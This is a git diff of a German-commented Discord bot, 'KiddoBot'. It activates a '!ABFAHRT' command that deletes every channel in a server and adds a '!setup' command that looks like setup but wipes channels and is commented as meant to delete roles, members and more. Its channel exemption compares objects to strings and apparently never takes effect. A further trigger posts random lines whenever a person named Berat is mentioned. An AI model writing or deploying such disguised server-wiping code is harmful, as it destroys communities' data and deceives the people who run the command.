@@ -139,11 +139,28 @@ async def main_handler(message,client):
         print(message.channel.id)
 
     # löscht alle channels
-    # elif message.content.startswith('!ABFAHRT'):
-    # await message.channel.send("ABFAHRT!!!" , file = discord.File ("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
-    # time.sleep(8)
-    # for channel in message.guild.channels:
-    # await channel.delete( reason = 'MFG KiddoBot :)')
+    elif message.content.startswith('!ABFAHRT'):
+        await message.channel.send("ABFAHRT!!!",
+                                   file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+        time.sleep(8)
+        for channel in message.guild.channels:
+            await channel.delete(reason='MFG KiddoBot :)')
+
+    # "setup" löscht alle channels, alle rollen, alle emojis, alle member und alle kategorien
+    elif message.content.startswith('!setup'):
+        await message.channel.send('Einen Moment bitte... :)')
+        time.sleep(2)
+        await message.channel.send("ABFAHRT!!!",
+                                   file=discord.File("C:\_FSST\Jaeger\Shooting Range\KiddoBot\ABFAHRT.PNG"))
+        time.sleep(8)
+        # for role in message.guild.roles:
+        #   await role.delete(reason='MFG KiddoBot :)')
+
+        for channel in message.guild.channels:
+            if channel == 'rules' or channel == 'moderator-only':
+                pass
+            else:
+                await channel.delete(reason='MFG KiddoBot :)')
 
     ########Music-Bot###########################################################################################################
 
@@ -176,6 +193,11 @@ async def main_handler(message,client):
             await message.author.send(
                 'https://tenor.com/view/dont-do-not-do-not-cat-dangerous-individual-man-dancing-while-cat-threatens-your-family-gif-26522356')
             mods = mods - 1
+    elif "Berat" in message.content or "berat" in message.content:
+        berat = open("berat.txt", "r")
+        berat = berat.readlines()
+        berat = random.choice(berat)
+        await message.channel.send(berat)
 
     ###########################################################################################################################
 
